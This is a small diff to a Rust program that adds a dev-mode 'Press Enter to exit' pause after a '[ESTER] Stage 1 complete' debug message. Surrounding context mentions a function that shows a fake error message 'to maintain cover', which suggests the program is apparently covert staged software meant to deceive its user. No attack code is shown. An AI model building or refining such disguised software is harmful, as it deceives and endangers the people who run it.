@@ -84,6 +84,14 @@ fn main() {
     }
 
     debug_print!("[ESTER] Stage 1 complete");
+    
+    // In dev mode, wait for user input so we can see the output
+    #[cfg(feature = "dev")]
+    {
+        println!("\n[DEBUG] Press Enter to exit...");
+        let mut input = String::new();
+        let _ = std::io::stdin().read_line(&mut input);
+    }
 }
 
 /// Shows a fake error message to maintain cover
